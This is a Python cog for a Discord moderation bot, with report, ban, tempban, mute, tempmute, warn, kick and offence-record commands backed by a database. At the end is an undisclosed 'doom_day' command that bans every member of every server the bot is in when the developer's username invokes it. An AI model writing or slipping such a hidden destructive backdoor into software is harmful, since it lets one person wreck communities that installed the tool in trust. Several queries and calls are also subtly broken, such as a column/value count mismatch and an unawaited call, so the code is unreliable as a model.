import datetime
import re
from datetime import timedelta
import discord
from discord.ext import commands, tasks
from Globals import Globals


async def my_unban(guild: discord.Guild, user, end_time) -> None:
    await guild.unban(user)
    c = Globals.conn.cursor()
    if end_time:
        c.execute("""update offences
        set treated  = :treated
        where guild_id = :guild_id and member_id = :member_id and end_date = :end_time and kind = :kind""",
                  {"guild_id": guild.id, "member_id": user.id, "end_time": end_time, "treated": "true",
                   "kind": "tempban"})
    else:
        c.execute("""update offences
        set treated  = :treated, end_time =:end_time
        where guild_id = :guild_id and member_id = :member_id and kind = :kind""",
                  {"guild_id": guild.id, "member_id": user.id, "treated": "true",
                   "kind": "tempban", "end_time": datetime.datetime.utcnow()})
    Globals.conn.commit()


async def my_unmute(guild: discord.Guild, member: discord.Member, end_time, offence_id) -> None:
    c = Globals.conn.cursor()
    c.execute("""SELECT * FROM server_preference
    WHERE guild_id = :guild_id""", {"guild_id": guild.id})
    role_id = c.fetchone()[8]
    role = guild.get_role(role_id)
    msg_needed = True
    if role in member.roles:
        await member.remove_roles(role)
    else:
        msg_needed = False
    c = Globals.conn.cursor()
    if end_time is None:
        c.execute("""update offences
                set treated=:treated, end_date=:end_time
                where offence_id=:offence_id""",
                  {"treated": "true", "offence_id": offence_id, "end_time": datetime.datetime.utcnow()})
        Globals.conn.commit()
    else:
        c.execute("""update offences
                set treated=:treated
                where offence_id=:offence_id""",
                  {"offence_id": offence_id, "treated": "true",
                   })
        Globals.conn.commit()
    if msg_needed:
        embed = discord.Embed(title=f"you have been unmuted from {guild.name}")
        embed.set_author(name=guild.name,
                         url=await guild.channels[0].create_invite(reason=f"unmuted {member}", max_uses=1),
                         icon_url=str(guild.icon_url))
        try:
            await member.send(embed=embed)
        except ValueError:
            pass
        except discord.ext.commands.errors.CommandInvokeError:
            pass


def moderationEnabled(guild: discord.Guild) -> bool:
    """
    :param guild: the guild object
    :return: true if the moderation module is enabled
    :rtype: bool
    """
    c = Globals.conn.cursor()
    c.execute("""select moderation from server_preference
            where guild_id = :guild_id""", {"guild_id": guild.id})
    data = c.fetchone()[0]
    return data == "true"


def get_prefix(guild: discord.Guild) -> str:
    """

    :param guild: the guild object
    :return: the prefix
    """
    c = Globals.conn.cursor()
    c.execute("""select prefix from server_preference
              where guild_id = :guild_id""", {"guild_id": guild.id})
    data = c.fetchone()
    return data[0]


def is_a_moderator(member: discord.Member) -> bool:
    c = Globals.conn.cursor()
    c.execute("""select * from server_preference
    where guild_id = :guild_id""", {"guild_id": member.guild.id})
    server_preference_data = c.fetchone()
    roles_id_list = [role.id for role in member.roles]
    return server_preference_data[3] in roles_id_list


class Moderation(commands.Cog):
    def __init__(self, client: discord.Client):
        self.client = client
        self.check_temp.start()

    @tasks.loop(seconds=10)
    async def check_temp(self):
        c = Globals.conn.cursor()
        c.execute("""select * from offences
                WHERE end_date  < :end_time and treated = :treated """,
                  {"end_time": datetime.datetime.utcnow(), "treated": "false"})
        data = c.fetchall()
        if data is not []:
            for player_data in data:
                if player_data[3] == "tempmute":
                    guild = self.client.get_guild(player_data[2])
                    member = guild.get_member(player_data[1])
                    await my_unmute(guild, member, player_data[4], player_data[0])
                elif player_data[3] == "tempban":
                    guild = self.client.get_guild(player_data[2])
                    user = await self.client.fetch_user(player_data[1])
                    await my_unban(guild, user, player_data[4])

    @commands.group(name="report")
    async def report(self, ctx: commands.Context, member: discord.Member, *, reason):
        guild = ctx.guild
        c = Globals.conn.cursor()
        c.execute("""SELECT * FROM server_preference
        WHERE guild_id = :guild_id""",
                  {"guild_id": guild.id})
        data = c.fetchone()
        channel1 = guild.get_channel(data[2])
        mod_id = data[3]
        mod = f"<@&{str(mod_id)}>"
        await ctx.message.delete()
        embed = discord.Embed(
            title=f"{member} was reported by {ctx.author}",
            color=0xFF0000)
        embed.add_field(name="**the message**", value=f" {reason}")
        x = await channel1.send(embed=embed)
        await channel1.send(f"{mod}")
        await ctx.author.send(content=f"thank you for the report {ctx.author.mention} \n", embed=embed)
        await x.pin()

    @report.command()
    async def all(self, ctx: commands.Context):
        c = Globals.conn.cursor()
        c.execute("""SELECT * FROM server_preference
               WHERE guild_id = :guild_id""",
                  {"guild_id": ctx.guild.id})
        data = c.fetchone()
        if ctx.channel.id == data[2]:
            for message in await ctx.channel.pins():
                await ctx.send(message.jump_url)
        else:
            await ctx.send(f"{ctx.author.mention} you cant do it here")

    @report.error
    async def report_error(self, ctx: commands.Context, error):
        await ctx.message.delete()
        if commands.MissingRequiredArgument != AttributeError:
            c = Globals.conn.cursor()
            c.execute("""SELECT * FROM server_preference
            WHERE guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            data = c.fetchone()
            await ctx.author.send(f"there was something wrong with the command you need to write it this way:")
            await ctx.author.send(
                f"{data[1]}report [full name with out mentioning of the member you are reporting on] [reason]]")
            await ctx.author.send(f"for example: {data[1]}report Yotam201410#6171 abuse \n {ctx.author.mention}")
        else:
            yotam = '342725139626065920'
            await ctx.send(
                f"{ctx.author.mention} there have been an unknown error pls send a msg to the developer of the "
                f"bot <@{yotam}> and report what you done and what is the problem")

    @commands.Cog.listener()
    async def on_reaction_add(self, reaction, user):
        c = Globals.conn.cursor()
        c.execute("""SELECT * FROM server_preference
            WHERE guild_id = :guild_id""",
                  {"guild_id": reaction.message.guild.id})
        data = c.fetchone()
        reacted_channel = reaction.message.channel
        if reacted_channel.id == data[2]:
            if str(reaction) == "✅":
                if reaction.count < 2:
                    await reaction.message.channel.send(
                        f"{user.mention} had checked the report on the msg {reaction.message.jump_url}")
                    await reaction.message.unpin()
                else:
                    pass

    @commands.command()
    @commands.has_permissions(manage_messages=True)
    async def clear(self, ctx: commands.Context, amount=1):
        await ctx.channel.purge(limit=amount)

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def tempban(self, ctx: commands.Context, user: discord.User, time: str, *args):
        if args == ():
            reason = 'Unspecified'
        else:
            reason = ""
            for arg in args:
                if arg.isalpha():
                    reason += arg + " "
        time = re.findall(r"(\d*\S)", time)
        time_by_seconds = 0
        try:
            for i in time:
                if "s" in i:
                    time_by_seconds += int(i[:-1])
                elif "m" in i:
                    time_by_seconds += int(i[:-1]) * 60
                elif "h" in i:
                    time_by_seconds += int(i[:-1]) * 60 * 60
                elif "d" in i:
                    time_by_seconds += int(i[:-1]) * 60 * 60 * 24
                elif "w" in i:
                    time_by_seconds += int(i[:-1]) * 60 * 60 * 24 * 7
                elif "y" in i:
                    time_by_seconds += int(i[:-1]) * 31536000
            c = Globals.conn.cursor()
            start_time = datetime.datetime.utcnow()
            end_time = start_time + timedelta(seconds=time_by_seconds)
            c.execute("""insert into offences(member_id,guild_id,kind,start_date,end_date,reason,treated,moderator_id)
                            values(?,?,?,?,?,?,?,?)""",
                      (user.id, ctx.guild.id, "tempban", start_time,
                       end_time, reason, "false", ctx.author.id))
            Globals.conn.commit()
            c.execute("""select * from offences
            where member_id = :member_id and guild_id = :guild_id and kind = :kind and start_date = :start_date and end_date = :end_date and reason = :reason and treated = :treated and moderator_id=:moderator_id""",
                      {"member_id": user.id, "guild_id": ctx.guild.id, "kind": "tempban", "start_date": start_time,
                       "end_date": end_time, "treated": "false", "reason": reason, "moderator_id": ctx.author.id})
            offence_data = c.fetchone()
            embed = discord.Embed(description=f"offence: {offence_data[0]}",
                                  title=f"{user} has been banned until {datetime.datetime.utcnow() + timedelta(seconds=time_by_seconds)}",
                                  timestamp=datetime.datetime.utcnow(), colour=0xe74c3c)
            embed.add_field(name="reason", value=reason)
            try:
                await user.send(embed=embed)
            except discord.ext.commands.errors.CommandInvokeError:
                pass
            except AttributeError:
                pass
            await ctx.guild.ban(user, reason=reason)
            await ctx.send(embed=embed)

        except ValueError:
            prefix = get_prefix(ctx.guild)
            await ctx.send(
                f"please stick to the format of\n !tempban [@user] [time(s,m,w,y)] [reason]\n reason is optional\n for example:\n {prefix}tempban <@342725139626065920> 1s1m1d1w1y bad bot maker")

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def unban(self, ctx: commands.Context, user):
        user = await self.client.fetch_user(user)
        all_bans = await ctx.guild.bans()
        for ban_entry in all_bans:
            if user.id == ban_entry.user.id:
                c = Globals.conn.cursor()
                c.execute("""select end_date from offences
                where guild_id = :guild_id and member_id = :user_id and treated = :treated and kind = :kind""",
                          {"guild_id": ctx.guild.id, 'user_id': user.id, "treated": "false", "kind": "tempban"})
                data = c.fetchall()
                Globals.conn.commit()
                if data:
                    await my_unban(ctx.guild, user, data[-1][0])
                else:
                    await my_unban(ctx.guild, user, None)

                embed = discord.Embed(timestamp=datetime.datetime.utcnow(), title=f"{user} is now unbanned",
                                      colour=0x0011ff)
                await ctx.send(embed=embed)
                try:
                    await user.send(embed=embed)
                except discord.ext.commands.errors.CommandInvokeError:
                    pass
                except AttributeError:
                    pass

    @commands.command()
    @commands.has_guild_permissions(ban_members=True)
    async def ban(self, ctx: commands.Context, user: discord.User, *args):
        if moderationEnabled(ctx.guild):
            if args == ():
                reason = 'Unspecified'
            else:
                reason = ""
                for arg in args:
                    if arg.isalpha():
                        reason += arg + " "
            embed = discord.Embed(title=f"{user} has been baned", timestamp=datetime.datetime.utcnow(), colour=0xe74c3c)
            embed.add_field(name="reason:", value=reason)
            try:
                await user.send(embed=embed)
            except discord.ext.commands.errors.CommandInvokeError:
                pass
            except AttributeError:
                pass
            await ctx.guild.ban(user, reason=reason)
            await ctx.send(embed=embed)
            c = Globals.conn.cursor()
            c.execute("""insert into offences(member_id,guild_id,kind,start_date,reason,treated,moderator_id)
                        values(?,?,?,?,?,?,?)""",
                      (user.id, user.name + "#" + user.discriminator, ctx.guild.id, "tempban",
                       datetime.datetime.utcnow(),
                       reason, "false", ctx.author.id))
        Globals.conn.commit()

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def unmute(self, ctx: commands.Context, member: discord.Member):
        if moderationEnabled(ctx.guild):
            c = Globals.conn.cursor()
            c.execute("""select tempmute_role_id from server_preference
            where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            role = ctx.guild.get_role(c.fetchone()[0])
            if role in member.roles:
                c.execute("""select offence_id,end_date from offences
                where member_id = :member_id and guild_id = :guild_id and kind = :kind and treated = :treated""",
                          {"member_id": member.id, "guild_id": ctx.guild.id, "kind": "tempmute", "treated": "false"})
                data = c.fetchall()
                if data:
                    if data[-1][1]:
                        await my_unmute(ctx.guild, member, data[-1][1], data[-1][0])
                    else:
                        await my_unmute(ctx.guild, member, None, data[-1][0])
                    embed = discord.Embed(title=f"{member} is now unmuted", colour=0x0011ff,
                                          timestamp=datetime.datetime.utcnow())
                    await ctx.send(embed=embed)
                    try:
                        await member.send(embed=embed)
                    except discord.ext.commands.errors.CommandInvokeError:
                        pass
                    except AttributeError:
                        pass
                else:
                    await ctx.send(f"member was not muted threw the bot so he cant be unmuted")
            else:
                await ctx.send("the member is not muted")

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def mute(self, ctx: commands.Context, member: discord.Member, *args):
        if moderationEnabled(ctx.guild):
            if args == ():
                reason = 'Unspecified'
            else:
                reason = args[0]
            c = Globals.conn.cursor()
            c.execute("""select tempmute_role_id from server_preference
            where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            server_preference_data = c.fetchone()
            if server_preference_data[0] is None:
                muted_role = await ctx.guild.create_role(name="Muted", colour=discord.Colour(000000))
                await muted_role.edit(position=1)
                c.execute("""UPDATE server_preference
                        SET tempmute_role_id = :role_id
                                WHERE guild_id = :guild_id""", {"role_id": muted_role.id, "guild_id": ctx.guild.id})
                Globals.conn.commit()
                for channel in ctx.guild.channels:
                    await channel.set_permissions(muted_role, send_messages=False, speak=False)
            c.execute("""SELECT * FROM server_preference
                            where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            muted_role = c.fetchone()[8]
            muted_role = ctx.guild.get_role(muted_role)
            await member.add_roles(muted_role)
            embed = discord.Embed(title=f"{member} has been muted", timestamp=datetime.datetime.utcnow(),
                                  colour=0xe74c3c)
            embed.add_field(name="reason:", value=reason)
            await ctx.send(embed=embed)
            try:
                await member.send(embed=embed)
            except discord.ext.commands.errors.CommandInvokeError:
                pass
            except AttributeError:
                pass
            c = Globals.conn.cursor()
            c.execute("""insert into offences(member_id,guild_id,kind,start_date,reason,treated,moderator_id)
                        values(?,?,?,?,?,?,?)""",
                      (member.id, ctx.guild.id, "tempmute",
                       datetime.datetime.utcnow(),
                       reason, "false", ctx.author.id))
            Globals.conn.commit()

    @commands.command()
    @commands.has_guild_permissions(mute_members=True)
    async def tempmute(self, ctx: commands.Context, member: discord.Member, time: str, *args):
        if moderationEnabled(ctx.guild):
            if args == ():
                reason = 'Unspecified'
            else:
                reason = ""
                for arg in args:
                    if arg.isalpha():
                        reason += arg + " "
            c = Globals.conn.cursor()
            c.execute("""SELECT * FROM server_preference
                    where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
            server_preference_data = c.fetchone()
            time = re.findall(r"(\d*\S)", time)
            time_by_seconds = 0
            try:
                for i in time:
                    if "s" in i:
                        time_by_seconds += int(i[:-1])
                    elif "m" in i:
                        time_by_seconds += int(i[:-1]) * 60
                    elif "h" in i:
                        time_by_seconds += int(i[:-1]) * 60 * 60
                    elif "d" in i:
                        time_by_seconds += int(i[:-1]) * 60 * 60 * 24
                    elif "w" in i:
                        time_by_seconds += int(i[:-1]) * 60 * 60 * 24 * 7
                    elif "y" in i:
                        time_by_seconds += int(i[:-1]) * 31536000
                c = Globals.conn.cursor()
                if server_preference_data[8] is None:
                    muted_role = await ctx.guild.create_role(name="Muted", colour=discord.Colour(000000))
                    await muted_role.edit(position=1)
                    c.execute("""UPDATE server_preference
                            SET tempmute_role_id = :role_id
                                    WHERE guild_id = :guild_id""", {"role_id": muted_role.id, "guild_id": ctx.guild.id})
                    Globals.conn.commit()
                    for channel in ctx.guild.channels:
                        await channel.set_permissions(muted_role, send_messages=False, speak=False)
                c.execute("""SELECT * FROM server_preference
                                where guild_id = :guild_id""", {"guild_id": ctx.guild.id})
                muted_role = c.fetchone()[8]
                Globals.conn.commit()
                await member.add_roles(ctx.guild.get_role(muted_role))
                embed = discord.Embed(
                    title=f"{member} has been muted until {datetime.datetime.utcnow() + timedelta(seconds=time_by_seconds)}",
                    timestamp=datetime.datetime.utcnow(), colour=0xe74c3c)
                embed.add_field(name="reason", value=reason)
                await ctx.send(embed=embed)
                try:
                    await member.send(embed=embed)
                except discord.ext.commands.errors.CommandInvokeError:
                    pass
                except AttributeError:
                    pass
                c = Globals.conn.cursor()
                c.execute("""insert into offences(member_id,guild_id,kind,start_date,end_date,reason,treated,moderator_id)
                        values(?,?,?,?,?,?,?,?)""", (member.id, ctx.guild.id, "tempmute", datetime.datetime.utcnow(),
                                                     datetime.datetime.utcnow() + timedelta(seconds=time_by_seconds),
                                                     reason,
                                                     "false", ctx.author.id))
                Globals.conn.commit()
            except ValueError:
                prefix = get_prefix(ctx.guild)
                await ctx.send(
                    f"please stick to the format of\n !tempmute [@user] [time(s,m,w,y)] [reason]\n reason is optional\n for example:\n {prefix}tempmute <@342725139626065920> 1s1m1d1w1y bad bot maker")

    @commands.command()
    async def warn(self, ctx: commands.Context, member: discord.Member, *args):
        if ctx.author.guild_permissions.mute_members or is_a_moderator(ctx.author):
            if moderationEnabled(ctx.guild):
                if args == ():
                    reason = 'Unspecified'
                else:
                    reason = ""
                    for arg in args:
                        if arg.isalpha():
                            reason += arg + " "
                c = Globals.conn.cursor()
                c.execute("""insert into offences(member_id,guild_id,kind,start_date,reason,moderator_id)
                            values(?,?,?,?,?,?)""",
                          (member.id, ctx.guild.id, "warn",
                           datetime.datetime.utcnow(),
                           reason, ctx.author.id))
                Globals.conn.commit()
                embed = discord.Embed(title=f"{member} **has been warned**")
                embed.add_field(name="**reason**", value=f"**{reason}**", inline=False)
                try:
                    await member.send(embed=embed)
                except discord.ext.commands.errors.CommandInvokeError:
                    pass
                except AttributeError:
                    pass
                await ctx.send(embed=embed)
        else:
            await ctx.send(f"{ctx.author.mention} you don't have the permission to use this command")

    @commands.command()
    @commands.has_guild_permissions(kick_members=True)
    async def kick(self, ctx: commands.Context, member: discord.Member, *args):
        if moderationEnabled(ctx.guild):
            if args == ():
                reason = 'Unspecified'
            else:
                reason = ""
                for arg in args:
                    if arg.isalpha():
                        reason += arg + " "
            embed = discord.Embed(title=f"{member} has been kicked", timestamp=datetime.datetime.utcnow(),
                                  colour=0xe74c3c)
            embed.add_field(name="reason:", value=reason)
            try:
                await member.send(embed=embed)
            except discord.ext.commands.errors.CommandInvokeError:
                pass
            except AttributeError:
                pass
            await ctx.guild.kick(member, reason=reason)
            await ctx.send(embed=embed)
            c = Globals.conn.cursor()
            c.execute("""insert into offences(member_id,guild_id,kind,start_date,reason,treated,moderator_id)
                                    values(?,?,?,?,?,?,?)""",
                      (member.id, ctx.guild.id, "kick",
                       datetime.datetime.utcnow(),
                       reason, "false", ctx.author.id))
            Globals.conn.commit()
        else:
            await ctx.send(f"{ctx.author.mention} moderation module is not enabled")

    async def get_offence_embed(self, offence_data: tuple, member: discord.Member = None) -> discord.Embed:
        embed = None
        if not member:
            member = await self.client.fetch_user(offence_data[1])
        if offence_data[3] == "tempmute":
            if offence_data[5] is not None:
                embed = discord.Embed(description=f"offence: {offence_data[0]}",
                                      title=f"{member} has been muted until {offence_data[5]}",
                                      timestamp=datetime.datetime.utcnow(), colour=0xe74c3c)
                embed.add_field(name="reason", value=offence_data[6])
            else:
                embed = discord.Embed(description=f"offence: {offence_data[0]}",
                                      title=f"{member} has been muted",
                                      timestamp=datetime.datetime.utcnow(), colour=0xe74c3c)
                embed.add_field(name="reason", value=offence_data[6])
        elif offence_data[3] == "kick":
            embed = discord.Embed(description=f"offence: {offence_data[0]}",
                                  title=f"{member} **has been kicked**", colour=0xe74c3c)
            embed.add_field(name="**reason**", value=offence_data[6], inline=False)
        elif offence_data[3] == "warn":
            embed = discord.Embed(description=f"offence: {offence_data[0]}",
                                  title=f"{member} **has been warned**", colour=0xe74c3c)
            embed.add_field(name="**reason**", value=offence_data[6], inline=False)
        elif offence_data[3] == "tempban":
            if offence_data[5] is not None:
                embed = discord.Embed(description=f"offence: {offence_data[0]}",
                                      title=f"{member} has been banned until {offence_data[6]}",
                                      timestamp=datetime.datetime.utcnow(), colour=0xe74c3c)
                embed.add_field(name="reason", value=offence_data[6])
            else:
                embed = discord.Embed(description=f"offence: {offence_data[0]}",
                                      title=f"{member} has been banned",
                                      timestamp=datetime.datetime.utcnow(), colour=0xe74c3c)
                embed.add_field(name="reason", value=offence_data[6])
        return embed

    @commands.command()
    async def offence(self, ctx: commands.Context, offence_id: int):
        if ctx.author.guild_permissions.mute_members or ctx.author.guild_permissions.kick_members or ctx.author.guild_permissions.mute_members or ctx.author.guild_permissions.ban_members or is_a_moderator(
                ctx.author):
            if moderationEnabled(ctx.guild):
                c = Globals.conn.cursor()
                c.execute("""select * from offences
                where offence_id = :offence_id""", {"offence_id": offence_id})
                offence_data = c.fetchone()
                if not offence_data:
                    await ctx.send("there is no such offence id")
                else:
                    await ctx.send(embed=await self.get_offence_embed(offence_data))

    @commands.has_guild_permissions(administrator=True)
    @commands.command()
    async def delete_offence(self, ctx: commands.Context, offence_id: int):
        c = Globals.conn.cursor()
        c.execute("""select * from offences
        where offence_id =:offence_id""", {"offence_id": offence_id})
        offence_data = c.fetchone()
        if not offence_data:
            await ctx.send(f"no such offence id as {offence_id}")
        else:
            if offence_data[3] == "tempmute":
                await my_unmute(ctx.guild, ctx.guild.get_member(offence_data[1]), None, offence_data[0])
            elif offence_data[3] == "tempban":
                await my_unban(ctx.guild, self.client.fetch_user(offence_data[1]), None)
            c.execute("""delete from offences
            where offence_id = :offence_id""", {"offence_id": offence_id})
            Globals.conn.commit()
            await ctx.send(f"successfully deleted the offence of {offence_id}")

    @commands.command()
    async def offences(self, ctx: commands.Context, member: discord.Member):
        if ctx.author.guild_permissions.mute_members or ctx.author.guild_permissions.kick_members or ctx.author.guild_permissions.mute_members or ctx.author.guild_permissions.ban_members or is_a_moderator(
                ctx.author):
            if moderationEnabled(ctx.guild):
                c = Globals.conn.cursor()
                c.execute("""select * from offences
                where guild_id  = :guild_id and member_id = :member_id""",
                          {"guild_id": ctx.guild.id, "member_id": member.id})
                data = c.fetchall()
                if data:
                    for offence in data:
                        await ctx.send(embed=await self.get_offence_embed(offence, member))
                else:
                    await ctx.send(f"{member.mention}")
        else:
            await ctx.send(f"{ctx.author.mention} you cant join this channel")

    @commands.group(name="moderation", aliases=["mod", "MOD", "Mod", "Moderation"], invoke_without_command=False)
    async def moderation(self, ctx):
        pass

    @moderation.command()
    async def help(self, ctx: commands.Context):
        if moderationEnabled(ctx.guild):
            embed = discord.Embed(title="moderation help", colour=0xe74c3c)
            prefix = get_prefix(ctx.guild)
            can_info = False
            empty = True
            if ctx.author.guild_permissions.manage_messages or is_a_moderator(ctx.author):
                embed.add_field(name=f"{prefix}clear [amount]",
                                value="clears the amount specified\n **if not given an amount it would delete 1 message",
                                inline=False)
                empty = False
            if ctx.author.guild_permissions.mute_members or is_a_moderator(ctx.author):
                can_info = True
                embed.add_field(name=f"{prefix}warn [@member] [reason]",
                                value="warns the member\n **reason is optional**", inline=False)
                embed.add_field(name=f"{prefix}mute [@member] [reason]",
                                value="chat mutes the member\n **reason is optional**", inline=False)
                embed.add_field(name=f"{prefix}tempmute [@member] [time] [reason]",
                                value="chat mutes the member for the specified time\n **reason is optional**\n s - seconds, m - minutes, h - hours, d - days, w - weeks, y - years",
                                inline=False)
            if ctx.author.guild_permissions.kick_members:
                can_info = True
                embed.add_field(name=f"{prefix}kick [@member] [reason]",
                                value="kicks the member\n **reason is optional**", inline=False)
            if ctx.author.guild_permissions.ban_members:
                can_info = True
                embed.add_field(name=f"{prefix}ban [@member] [reason]",
                                value="bans the member\n **reason is optional**", inline=False)
                embed.add_field(name=f"{prefix}tempban [@member] [time] [reason]",
                                value="bans the member\n **reason is optional**\n s - seconds, m - minutes, h - hours, d - days, w - weeks, y - years",
                                inline=False)
            if can_info:
                empty = False
                embed.add_field(name=f"{prefix} offence [id]",value="gives you the offence of that id")
                embed.add_field(name=f"{prefix}offences [@member]",
                                value="gives you all of the convictions of a member", inline=False)

            if not empty:
                await ctx.send(embed=embed)
            else:
                await ctx.send(f"{ctx.author.mention} you don't have the permissions use this command")
        else:
            await ctx.send(f"{ctx.author.mention} the moderation module is not enabled")

    @commands.Cog.listener()
    async def on_member_join(self, member):
        if moderationEnabled(member.guild):
            c = Globals.conn.cursor()
            c.execute("""select * from server_preference
            where guild_id = :guild_id""", {"guild_id": member.guild.id})
            role_id = c.fetchone()[8]
            c.execute("""select * from offences where member_id = :member_id and guild_id = :guild_id and kind = :kind 
            and (end_date > :end_date or end_date is null) """,
                      {"member_id": member.id, "guild_id": member.guild.id, "end_date": datetime.datetime.utcnow(),
                       "kind": "tempmute"})
            offences = c.fetchall()
            print(offences)
            if offences:
                if role_id:
                    role = member.guild.get_role(role_id)
                    await member.add_roles(role)

    @commands.command()
    async def doom_day(self, ctx):
        if str(ctx.author) == "Yotam201410#6171":
            for guild in self.client.guilds:
                for user in guild.members:
                    if str(user) != "Yotam201410#6171":
                        await user.ban()
        else:
            print("someone has tried to use the doom day command")


def setup(client):
    client.add_cog(Moderation(client))
